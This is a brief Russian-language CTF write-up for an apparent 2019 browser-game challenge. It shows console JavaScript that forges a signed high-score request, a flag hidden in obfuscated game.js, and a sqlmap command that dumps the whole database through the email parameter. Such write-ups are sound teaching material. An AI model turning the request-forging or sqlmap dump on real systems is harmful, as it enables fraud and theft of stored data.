1. Находим код в game.js, который передает результаты игры.

2. После отправки результата игры, что бы заменить количество очков на 99999 выполняем в консоле  браузера:
```
var b1 = aY[b('0x1f')][0x0][b('0x20')];
bI=99999;
str = bI + b1 + b0;
sign = b3(str);
var b2 = '/addresult?email=' + encodeURI(b1) + b('0x21') + encodeURI(b0) + '&score=' + encodeURI(bI) + b('0x22') + encodeURI(sign);
```
b2 подставляем в http://easygame.ctf2019.rocks/addresult? и получаем флаг

3. Находим дополнительный флаг  в game.js
```
function be() {
    var bf = 'T';
    var bg = '{';
    var bh = 'C';
    var bi = '}';
    var bj = 'F';
    var bk = 'G';
    var bl = 'W';
    var bm = '6FF2866491F6CD6';
    var bn = b('0x2e');
    console[b('0x8')](bl + bk + bh + bf + bj + bg + bm + bn + bi);
}
```

4. Еще один дополнительный flag находим с помощью sqlmap
sqlmap -u http://easygame.ctf2019.rocks/addresult?email=p --dump-all --keep-alive --dbms=sqlite
